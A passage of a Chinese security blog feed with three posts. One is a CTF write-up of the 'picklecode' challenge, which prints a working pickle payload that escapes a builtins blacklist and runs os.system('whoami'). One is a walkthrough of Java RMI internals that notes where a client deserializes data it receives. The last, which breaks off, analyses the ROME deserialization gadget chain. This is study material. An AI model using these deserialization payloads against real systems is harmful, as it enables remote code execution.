class="comment">#b&#x27;Y19fbWFpbl9fCnNlY3JldAooUyduYW1lJwpTIjEiClMiY2F0ZWdvcnkiClMiMiIKZGIwKGNfX21haW5fXwpBbmltYWwKUyIxIgpTIjIiCm8uCg==&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="Code-Breaking-picklecode"><a href="#Code-Breaking-picklecode" class="headerlink" title="Code Breaking picklecode"></a>Code Breaking picklecode</h2><p>题目将pickle能够引入的模块限定为<code>builtins</code>，并且设置了子模块黑名单：<code>&#123;&#39;eval&#39;, &#39;exec&#39;, &#39;execfile&#39;, &#39;compile&#39;, &#39;open&#39;, &#39;input&#39;, &#39;__import__&#39;, &#39;exit&#39;&#125;</code>，于是我们能够<strong>直接</strong>利用的模块有：</p>
<ul>
<li><code>builtins</code>模块中，黑名单外的子模块。</li>
<li>已经<code>import</code>的模块：<code>io</code>、<code>builtins</code>（需要先利用<code>builtins</code>模块中的函数）</li>
</ul>
<p>黑名单中没有<code>getattr</code>，所以可以通过<code>getattr</code>获取<code>io</code>或<code>builtins</code>的子模块以及子模块的子模块:)，而<code>builtins</code>里有<code>eval、exec</code>等危险函数，即使在黑名单中，也可以通过<code>getattr</code>获得。pickle不能直接获取<code>builtins</code>一级模块，但可以通过<code>builtins.globals()</code>获得<code>builtins</code>；这样就可以执行任意代码了。payload为：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">b&#x27;&#x27;&#x27;cbuiltins</span></span><br><span class="line"><span class="string">getattr</span></span><br><span class="line"><span class="string">p0</span></span><br><span class="line"><span class="string">(cbuiltins</span></span><br><span class="line"><span class="string">dict</span></span><br><span class="line"><span class="string">S&#x27;get&#x27;</span></span><br><span class="line"><span class="string">tRp1</span></span><br><span class="line"><span class="string">cbuiltins</span></span><br><span class="line"><span class="string">globals</span></span><br><span class="line"><span class="string">)Rp2</span></span><br><span class="line"><span class="string">00g1</span></span><br><span class="line"><span class="string">(g2</span></span><br><span class="line"><span class="string">S&#x27;builtins&#x27;</span></span><br><span class="line"><span class="string">tRp3</span></span><br><span class="line"><span class="string">0g0</span></span><br><span class="line"><span class="string">(g3</span></span><br><span class="line"><span class="string">S&#x27;eval&#x27;</span></span><br><span class="line"><span class="string">tR(S&#x27;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#x27;</span></span><br><span class="line"><span class="string">tR.</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>


<p>pker写的话就很简单：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">getattr</span>=GLOBAL(<span class="string">&#x27;builtins&#x27;</span>,<span class="string">&#x27;getattr&#x27;</span>)</span><br><span class="line"><span class="built_in">dict</span>=GLOBAL(<span class="string">&#x27;builtins&#x27;</span>,<span class="string">&#x27;dict&#x27;</span>)</span><br><span class="line">dict_get=<span class="built_in">getattr</span>(<span class="built_in">dict</span>,<span class="string">&#x27;get&#x27;</span>)</span><br><span class="line">glo_dic=GLOBAL(<span class="string">&#x27;builtins&#x27;</span>,<span class="string">&#x27;globals&#x27;</span>)()</span><br><span class="line">builtins=dict_get(glo_dic,<span class="string">&#x27;builtins&#x27;</span>)</span><br><span class="line"><span class="built_in">eval</span>=<span class="built_in">getattr</span>(builtins,<span class="string">&#x27;eval&#x27;</span>)</span><br><span class="line"><span class="built_in">eval</span>(<span class="string">&#x27;print(&quot;123&quot;)&#x27;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br></pre></td></tr></table></figure>

<p>拿到builtins里的方法然后命令执行</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://x5tar.com/posts/python-pickle-unserialize">https://x5tar.com/posts/python-pickle-unserialize</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/89132768">https://zhuanlan.zhihu.com/p/89132768</a></p>
<p><a href="https://xz.aliyun.com/t/7436">https://xz.aliyun.com/t/7436</a></p>
]]></content>
      <categories>
        <category>pythonSec</category>
      </categories>
      <tags>
        <tag>python反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>rmi代码分析</title>
    <url>/2022/05/02/rmi%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h1 id="简介前的简介"><a href="#简介前的简介" class="headerlink" title="简介前的简介"></a>简介前的简介</h1><p>额，一直以来貌似养成了不好的习惯，在写完这一篇之后发现，我为什么要写文章啊。。</p>
<p>博客是放笔记的，对吧，写的自己看懂就行了。还指望给别人看呢。</p>
<p>所以这是本博客最后一篇可能有可能别人能看懂的文章。</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220430094406-ku9mt1b.png" alt="image.png"></p>
<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>在处理rmi的时候发现当时学的比较早导致一些东西没有分析的很清楚，今天把他其中的一些过程重新分析一下，rmi还是很重要的一部分。</p>
<p>对rmi其中的各种流程的代码部分进行简单的调试和分析。</p>
<p>简单写一个rmi本地调用的project即可开始调试。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.demo02;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIHello</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">IHello</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> <span class="title function_">RMIHello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">            <span class="built_in">super</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Hello&quot;</span>+name);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">register</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        RMIHello rmiHello=<span class="keyword">new</span> <span class="title class_">RMIHello</span>();</span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Naming.bind(<span class="string">&quot;rmi://127.0.0.1:1099/hello&quot;</span>,rmiHello);</span><br><span class="line">        System.out.println(<span class="string">&quot;Registry运行中......&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">RMIServer</span>().register();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h1><h2 id="服务端创建远程对象"><a href="#服务端创建远程对象" class="headerlink" title="服务端创建远程对象"></a>服务端创建远程对象</h2><p>rmi中的远程对象都继承了<code>UnicastRemoteObject</code>类，然后实现远程接口，<code>IHello</code>接口也继承了<code>Remote</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIHello</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">IHello</span>&#123;</span><br></pre></td></tr></table></figure>

<p>所以我们要看的就是他的构造方法</p>
<hr>
<h3 id="UnicastRemoteObject-exportObject"><a href="#UnicastRemoteObject-exportObject" class="headerlink" title="UnicastRemoteObject.exportObject"></a>UnicastRemoteObject.exportObject</h3><p>会先进入父类<code>UnicastRemoteObject</code>的构造方法，在<code>UnicastRemoteObject</code>构造方法中会进入<code>java.rmi.server.UnicastRemoteObject#exportObject(java.rmi.Remote, int)</code>方法</p>
<p>其中传入的默认的port为0</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220430115251-c5b84n3.png" alt="image.png"></p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220430115509-aev0l0d.png" alt="image.png"></p>
<p>所以首先会创建一个<code>UnicastServerRef</code>对象，</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220430115710-j5yzzyy.png" alt="image.png"></p>
<p>在创建这个对象的时候，首先又会封装一个<code>LiveRef</code>对象进去</p>
<h4 id="LiveRef"><a href="#LiveRef" class="headerlink" title="LiveRef"></a>LiveRef</h4><p>下面多次封装同一个LiveRef对象，就是为了客户端和服务端的通信</p>
<p><code>sun.rmi.transport.LiveRef</code>对象会封装进三个属性，其中包含了本地ip，它实际上是负责网络通信的一个对象</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220430115835-oq6cuos.png" alt="image.png"></p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220430115939-1c3x3vb.png" alt="image.png"></p>
<h4 id="UnicastServerRef"><a href="#UnicastServerRef" class="headerlink" title="UnicastServerRef"></a>UnicastServerRef</h4><p>UnicastServerRef类继承自UnicastRef类，其实也就是简单的把liveRef对象封装进去。</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220501232936-sihubqs.png" alt="image.png"></p>
<p>当我们封装好了<code>UnicastServerRef</code>对象的时候，再进入<code>java.rmi.server.UnicastRemoteObject#exportObject</code>方法中</p>
<p>封装好的<code>UnicastServerRef</code>对象：</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220501233118-qdzrbvb.png" alt="image.png"></p>
<p>其实又是一个封装的过程，把<code>UnicastServerRef</code>对象封装到一开始的<em>远程对象</em>中，也就是<code>RMIHello</code>这个远程对象</p>
<p>此时我们的远程对象已经创建好了</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220501233256-skki01h.png" alt="image.png"></p>
<h4 id="UnicastServerRef-exportObject"><a href="#UnicastServerRef-exportObject" class="headerlink" title="UnicastServerRef.exportObject"></a>UnicastServerRef.exportObject</h4><p>接着会进入<code>sun.rmi.server.UnicastServerRef#exportObject(java.rmi.Remote, java.lang.Object, boolean)</code>方法中</p>
<p>先用创建动态代理的方式创建了一个存根stub，他就是RMIHello的动态代理类</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220430221912-74xoh8s.png" alt="image.png"></p>
<h5 id="Util-createProxy"><a href="#Util-createProxy" class="headerlink" title="Util.createProxy"></a>Util.createProxy</h5><p>稍微跟进一下<code>sun.rmi.server.Util#createProxy</code>方法，他是一个创建动态代理的方法</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220501233821-g4uvmgu.png" alt="image.png"></p>
<p>getRemoteClass方法会对传入的远程对象进行一下验证然后返回它的class</p>
<p>接着就是创建动态代理，classloader,handler</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220501235123-nrespux.png" alt="image.png"></p>
<p>创建动态代理</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220501235230-gcj2jfi.png" alt="image.png"></p>
<p>可以看到返回的Proxy0动态代理对象，里面也封装了LiveRef这个对象</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220501235538-uyrd9be.png" alt="image.png"></p>
<hr>
<p>接着新建一个Target对象，把刚刚的一系列东西都封装进去</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220501235855-e4tx6on.png" alt="image.png"></p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220502000100-2r10ra9.png" alt="image.png"></p>
<hr>
<p>接下来进到<code>sun.rmi.transport.LiveRef#exportObject</code>方法中，也就是哪里都封装了的LiveRef对象</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220501154724-2c6h00x.png" alt="image.png"></p>
<p>这个方法进到<code>sun.rmi.transport.tcp.TCPTransport#exportObject</code>方法，实际上他就是开一个端口，然后把Target对象放上去</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220501154757-z6sxyy5.png" alt="image.png"></p>
<p>接着下面还会exportObject一次target，是进到<code>sun.rmi.transport.Transport#exportObject</code>方法中</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220502000458-yjwv6vo.png" alt="image.png"></p>
<p>根据注释理解一下，这个方法就是把远程对象放在服务端，等待客户端来的请求</p>
<p>下面的<code>sun.rmi.transport.ObjectTable#putTarget</code>也就是一个表put的操作，把target装入</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220502000701-3zyzueu.png" alt="image.png"></p>
<hr>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220502000834-bipeju0.png" alt="image.png"></p>
<p>最后返回的是这个对象，至此远程对象创建完毕</p>
<h2 id="注册中心创建逻辑"><a href="#注册中心创建逻辑" class="headerlink" title="注册中心创建逻辑"></a>注册中心创建逻辑</h2><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220501155207-0ldmwfw.png" alt="image.png"></p>
<p>其实就是新建一个RegistryImpl对象，传入的参数值是默认的1099端口</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220501160056-0ww1bzu.png" alt="image.png"></p>
<p>首先会创建一个LiveRef作用于通讯</p>
<p>又创建一个UnicastServerRef类，在服务端创建的时候我们已经遇到过了一次这个构造方法，再一次进入</p>
<p>可以看到也就只是封装了一个ref对象用于网络通讯</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220501160253-ih82ny6.png" alt="image.png"></p>
<p>接着进入setup方法</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220501160343-xnzpcbm.png" alt="image.png"></p>
<p>在其中我们又看到了熟悉的<code>sun.rmi.server.UnicastServerRef#exportObject(java.rmi.Remote, java.lang.Object, boolean)</code>方法，在上面创建服务端对象的时候也遇到过</p>
<p>不过这里参数有所不同</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220501160423-3kbzmw2.png" alt="image.png"></p>
<p>这里创建的代理是这个注册中心的代理类，也就是RegistryImpl类</p>
<p>他还会进入setSeleton方法中</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220501160554-dh8g271.png" alt="image.png"></p>
<blockquote>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220501160652-5o58gzz.png" alt="image.png"></p>
<p>可以看到createSelection方法接受一个Remote对象</p>
<p>然后加载它后缀加上Skel的class对象来获取Skeleton</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220501160903-459f9if.png" alt="image.png"></p>
</blockquote>
<p>这个方法过后，skeleton类被加载到这个UnicastServerRef中</p>
<p>skeleton和stub就是分别对应服务端和客户端的网络代理</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220501161058-si3jzgl.png" alt="image.png"></p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220501162044-z7izfgz.png" alt="image.png"></p>
<p>注册中心同时提供了skl和stub，因为要和服务端和客户端两端通讯</p>
<p>因此最终<code>createRegistry()</code>的结果就是返回了一个<code>RegistryImpl</code>对象，并且赋值<code>this.skel=RegistryImpl_Skel</code>。</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220502010214-ppg0qgx.png" alt="image.png"></p>
<h2 id="注册中心绑定逻辑"><a href="#注册中心绑定逻辑" class="headerlink" title="注册中心绑定逻辑"></a>注册中心绑定逻辑</h2><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220501162342-he8el2h.png" alt="image.png"></p>
<p>先获取到注册中心</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220501162405-yfa99q0.png" alt="image.png"></p>
<p>然后调用<code>sun.rmi.registry.RegistryImpl_Stub#bind</code>把UnicastServerRef对象绑定上去</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220501183232-uz4rh5e.png" alt="image.png"></p>
<h1 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h1><p>同样的先获取到注册中心</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220501194145-mayrxs7.png" alt="image.png"></p>
<p>返回的是注册中心的stub对象</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220501194221-vfdvky0.png" alt="image.png"></p>
<p>然后进到<code>sun.rmi.registry.RegistryImpl_Stub#lookup</code>方法中，也就是我们根据注册的名称来查找类</p>
<p>先会对我们查找的这个远程类名称字符串序列化进去</p>
<p>newCall方法就是一个网络请求的操作，这也和之前我们分析的流量对应了起来</p>
<p>说明注册中心也会有一个反序列化的操作</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220501194919-s6b9di5.png" alt="image.png"></p>
<p>然后在下面的invoke方法中实现网络请求</p>
<p>也就是这个executeCall方法</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220501195240-oqvfrmb.png" alt="image.png"></p>
<p>然后就通过反序列化得到返回来的远程对象代理</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220501195429-rkco705.png" alt="image.png"></p>
<p>这里有2个反序列化点，都是反序列化注册中心返回来的代理对象，如果我们创建一个恶意注册中心返回恶意stub就可能实现对客户端的反序列化攻击，分别是这两个地方（上面提了一个地方）</p>
<h2 id="UnicastRef-invoke"><a href="#UnicastRef-invoke" class="headerlink" title="UnicastRef.invoke"></a>UnicastRef.invoke</h2><p><code>sun.rmi.server.UnicastRef#invoke(java.rmi.server.RemoteCall)</code></p>
<p>第一个地方就是在invoke方法中的<code>sun.rmi.transport.StreamRemoteCall#executeCall</code>方法中</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220501195911-qumij3j.png" alt="image.png"></p>
<p>在处理异常的地方里面有一个反序列化的操作</p>
<p>如果是这个异常的话，就会触发反序列化</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220501200834-nyhcu1a.png" alt="image.png"></p>
<p>并且这个<code>sun.rmi.server.UnicastRef#invoke</code>方法在很多地方都会被调用</p>
<h2 id="RegistryImpl-Stub-lookup"><a href="#RegistryImpl-Stub-lookup" class="headerlink" title="RegistryImpl_Stub.lookup"></a>RegistryImpl_Stub.lookup</h2><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220501201220-dnkf9y3.png" alt="image.png"></p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220501201542-ngvl28l.png" alt="image.png"></p>
<p>最后就会获得之前我们创建的服务端对象的远程代理，可以看到里面封装的LiveRef对象</p>
<h1 id="远程方法调用"><a href="#远程方法调用" class="headerlink" title="远程方法调用"></a>远程方法调用</h1><p>因为我们获取hello对象是远程对象的动态代理，所以对他调用任意方法的时候就会进入handler（调用处理器）的invoke方法</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220501201937-eief2vw.png" alt="image.png"></p>
<p>首先会对这个方法是否属于该远程对象进行一个判断</p>
<p>然后这里又会调用<code>sun.rmi.server.UnicastRef#invoke(java.rmi.Remote, java.lang.reflect.Method, java.lang.Object[], long)</code>这个方法</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220501202434-haixi7n.png" alt="image.png"></p>
<p>接着<code>sun.rmi.server.UnicastRef#marshalValue</code>方法中会把参数值序列化进去</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220501202704-t2kqyd0.png" alt="image.png"></p>
<p>接下来又会调用到executeCall方法，所有的客户端的请求都会用到这个方法</p>
<blockquote>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220501203015-frla00p.png" alt="image.png"></p>
<p>这里建立的连接就是和服务端直接建立连接了</p>
</blockquote>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220501202615-nkk2aoo.png" alt="image.png"></p>
<p>接着就是获取方法调用结果</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220501202903-yeujj15.png" alt="image.png"></p>
<p>和上面的marshaValue对应，unmarshalValue方法中对返回的数据进行了反序列化处理</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220501202930-tierni1.png" alt="image.png"></p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220502010732-6uc4aqf.png" alt="image.png"></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>引用自<a href="https://zhishihezi.net/endpoint/richtext/6afc74481673af6429d96f73c340f7bc?event=436b34f44b9f95fd3aa8667f1ad451b173526ab5441d9f64bd62d183bed109b0ea1aaaa23c5207a446fa6de9f588db3958e8cd5c825d7d5216199d64338d9d00571152a420cac6258bd33ad949557d182c6ff5f5474f62c9815a8cca721c910502a64422f5bb96989f53cef2ae22d07a1ce71282863f5769d1661fd52e3b1970c1dba0b488dc02b9a345ec36cad6c7cd53afd7f10083e357f268fd3248ccfd7d5b11e47226e96d2f2a3033ee546b961d6cd75285ec2ae0f06ba0573b5d9fb4f11819d3dfd64d4cff04450762cdecfd051e990a1419cb198b787b39ec8f4d81c26ab3b7c18b2aa0744c225e3c03a3e5de2350bd5108c5814e14edcc23414a7153#0">Javasec</a></p>
<p>RMI 底层通讯采用了Stub (运行在客户端) 和 Skeleton (运行在服务端) 机制，RMI 调用远程方法的大致如下：</p>
<ol>
<li>RMI 客户端在调用远程方法时会先创建 Stub ( <code>sun.rmi.registry.RegistryImpl_Stub</code> )。</li>
<li>Stub 会将 Remote 对象传递给远程引用层 ( <code>java.rmi.server.RemoteRef</code> ) 并创建 <code>java.rmi.server.RemoteCall</code>( 远程调用 )对象。</li>
<li>RemoteCall 序列化 RMI 服务名称、Remote 对象。</li>
<li>RMI 客户端的远程引用层传输 RemoteCall 序列化后的请求信息通过 Socket 连接的方式传输到 RMI 服务端的远程引用层。</li>
<li>RMI服务端的远程引用层( <code>sun.rmi.server.UnicastServerRef</code> )收到请求会请求传递给 Skeleton ( <code>sun.rmi.registry.RegistryImpl_Skel#dispatch</code> )。</li>
<li>Skeleton 调用 RemoteCall 反序列化 RMI 客户端传过来的序列化。</li>
<li>Skeleton 处理客户端请求：bind、list、lookup、rebind、unbind，如果是 lookup 则查找 RMI 服务名绑定的接口对象，序列化该对象并通过 RemoteCall 传输到客户端。</li>
<li>RMI 客户端反序列化服务端结果，获取远程对象的引用。</li>
<li>RMI 客户端调用远程方法，RMI服务端反射调用RMI服务实现类的对应方法并序列化执行结果返回给客户端。</li>
<li>RMI 客户端反序列化 RMI 远程方法调用结果。</li>
</ol>
]]></content>
      <categories>
        <category>javaSec</category>
      </categories>
      <tags>
        <tag>rmi</tag>
      </tags>
  </entry>
  <entry>
    <title>rome反序列化链</title>
    <url>/2022/04/19/rome%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/</url>
    <content><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>突然发现十天没更新博客了，大概我觉得自己学的东西很垃圾，没有自己创造的一些东西吧。</p>
<p>但是日子还得过，博客还得写。</p>
<p>学习是一辈子的事情，不想让坏心情来妨碍我的步调。</p>
<h1 id="Gaget-Chains"><a href="#Gaget-Chains" class="headerlink" title="Gaget Chains"></a>Gaget Chains</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * TemplatesImpl.getOutputProperties()</span></span><br><span class="line"><span class="comment"> * NativeMethodAccessorImpl.invoke0(Method, Object, Object[])</span></span><br><span class="line"><span class="comment"> * NativeMethodAccessorImpl.invoke(Object, Object[])</span></span><br><span class="line"><span class="comment"> * DelegatingMethodAccessorImpl.invoke(Object, Object[])</span></span><br><span class="line"><span class="comment"> * Method.invoke(Object, Object...)</span></span><br><span class="line"><span class="comment"> * ToStringBean.toString(String)</span></span><br><span class="line"><span class="comment"> * ToStringBean.toString()</span></span><br><span class="line"><span class="comment"> * ObjectBean.toString()</span></span><br><span class="line"><span class="comment"> * EqualsBean.beanHashCode()</span></span><br><span class="line"><span class="comment"> * ObjectBean.hashCode()</span></span><br><span class="line"><span class="comment"> * HashMap&lt;K,V&gt;.hash(Object)</span></span><br><span class="line"><span class="comment"> * HashMap&lt;K,V&gt;.readObject(ObjectInputStream)</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> mbechler</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>


<h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><p>依赖：rome1.0+jdk1.8+tomcat9</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">  &lt;groupId&gt;rome&lt;/groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;rome&lt;/artifactId&gt;</span><br><span class="line">  &lt;version&gt;<span class="number">1.0</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220419085128-jkf2hpo.png" alt="image.png"></p>
<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><blockquote>
<p>基于ysoserial</p>
</blockquote>
<h2 id="ToStringBean-toString-String-prefix"><a href="#ToStringBean-toString-String-prefix" class="headerlink" title="ToStringBean.toString(String prefix)"></a>ToStringBean.toString(String prefix)</h2><p>首先分析这条链子的核心部分，可以看到ysoserial两次实例化了ObjectBean类</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220419091345-gcm8lww.png" alt="image.png"></p>
<p>出现问题的地方就是<code>ToStringBean.toString(String prefix)</code>，使用了invoke来反射调用方法，但是这个方法需要是无参的</p>
<p>如果这里我们能够调用恶意Templates类的<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#getOutputProperties</code>方法，就能动态加载恶意字节码从而触发命令执行</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220419091618-9ms9eln.png" alt="image.png"></p>
<p>但首先要解决的是<code>PropertyDescriptor[] pds = BeanIntrospector.getPropertyDescriptors(this._beanClass);</code></p>
<p>在构造方法中，<code>new ToStringBean(beanClass, obj);</code>传入的beanClass就是<code>BeanIntrospector.getPropertyDescriptors(this._beanClass);</code>中的<code>this._beanClass</code></p>
<p>接下来跟进<code>BeanIntrospector.getPropertyDescriptors</code>这个静态方法</p>
<h3 id="BeanIntrospector-getPropertyDescriptors"><a href="#BeanIntrospector-getPropertyDescriptors" class="headerlink" title="BeanIntrospector.getPropertyDescriptors"></a>BeanIntrospector.getPropertyDescriptors</h3><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220419093444-30g7vw8.png" alt="image.png"></p>
<p>调试时候发现要进到判断里去，跟进getPDs</p>
<p>这个方法主要是获取一个Class所有的getters和setters</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220419094733-1v82rar.png" alt="image.png"></p>
<p>调试中发现他获取了这个Templates类的outputProperties方法，他还有个重载方法用来获取具体的方法数组</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220419094928-cvyu0r1.png" alt="image.png"></p>
<h3 id="PropertyDescriptor"><a href="#PropertyDescriptor" class="headerlink" title="PropertyDescriptor"></a>PropertyDescriptor</h3><p>这个类是<code>java.beans</code>包下的工具类</p>
<p>PropertyDescriptor 类表示 JavaBean 类通过存储器导出一个属性。</p>
<p>构造方法有：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">PropertyDescriptor(String propertyName, Class&lt;?&gt; beanClass)</span><br><span class="line"></span><br><span class="line">PropertyDescriptor(String propertyName, Class&lt;?&gt; beanClass, String readMethodName, String writeMethodName)</span><br><span class="line"></span><br><span class="line">PropertyDescriptor(String propertyName, Method readMethod, Method writeMethod)</span><br></pre></td></tr></table></figure>

<p>常用方法有：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt; getPropertyType() <span class="comment">// 获取属性的java类型对象</span></span><br><span class="line">Method <span class="title function_">getReadMethod</span><span class="params">()</span> <span class="comment">// 获得用于读取属性值的方法</span></span><br><span class="line">Method <span class="title function_">getWriteMethod</span><span class="params">()</span> <span class="comment">// 获得用于写入属性值的方法</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">setReadMethod</span><span class="params">(Method readMethod)</span> <span class="comment">// Sets the method that should be used to read the property value.</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">setWriteMethod</span><span class="params">(Method writeMethod)</span> <span class="comment">//Sets the method that should be used to write the property value.</span></span><br></pre></td></tr></table></figure>


<h3 id="ToStringBean-toString"><a href="#ToStringBean-toString" class="headerlink" title="ToStringBean.toString"></a>ToStringBean.toString</h3><p>回到<code>ToStringBean.toString(String prefix)</code></p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220419095538-62z98f5.png" alt="image.png"></p>
<p>66行getName没啥用</p>
